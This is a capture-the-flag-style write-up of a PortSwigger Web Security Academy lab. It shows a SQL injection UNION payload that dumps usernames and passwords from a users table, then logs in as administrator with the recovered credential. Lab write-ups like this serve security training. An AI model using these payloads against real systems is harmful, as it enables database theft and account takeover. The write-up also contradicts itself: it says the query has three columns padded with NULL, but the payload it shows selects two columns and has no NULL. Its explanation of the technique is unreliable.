# SQL Injection UNION Attack — Retrieving Data from Other Tables

**Lab:** SQL injection UNION attack, retrieving data from other tables
**Source:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Difficulty:** Practitioner

## Description

The product category filter is vulnerable to SQL injection, with results reflected in the response. The database contains a separate `users` table with `username` and `password` columns. Goal is to dump all usernames and passwords via a UNION attack, then log in as `administrator`.

## Solution

### Step 1: Determine column count and string-compatible columns

From prior labs already knew the query returns 3 columns and that string data fits into the relevant columns (same technique as previous labs — `ORDER BY` to count columns, then `UNION SELECT NULL,...` to find string-compatible columns).

### Step 2: Query the `users` table via UNION

Used the known-good column layout to pull `username` and `password` from the `users` table, padding the extra column with `NULL`:

```sql
' UNION SELECT username, password FROM users--
```

Full injection in the category parameter:

```
Gifts' UNION SELECT username, password FROM users--
```

This returned every row from `users`, reflected in the product listing. Among the results:

```
administrator
7x0oxynaf7fh0icsj6dc
```

![UNION SELECT results showing usernames and passwords](content/assets/portswigger_sqli_union_retrieving_data/01-union-results.png)

### Step 3: Log in as administrator

Used the dumped credentials to log in:

- **Username:** `administrator`
- **Password:** `7x0oxynaf7fh0icsj6dc`

![Login form filled in](content/assets/portswigger_sqli_union_retrieving_data/02-login-form.png)

### Result

Successfully logged in as `administrator`, solving the lab.

![Lab solved confirmation](content/assets/portswigger_sqli_union_retrieving_data/03-lab-solved.png)

## Flag / Result

```
Logged in as administrator — lab solved
```

## Takeaway

Once you know the working column count and which columns accept strings, a UNION attack can pull data from *any* table the database user can access — not just the one the application intended. Sensitive tables like `users` are a prime target once injection is confirmed.
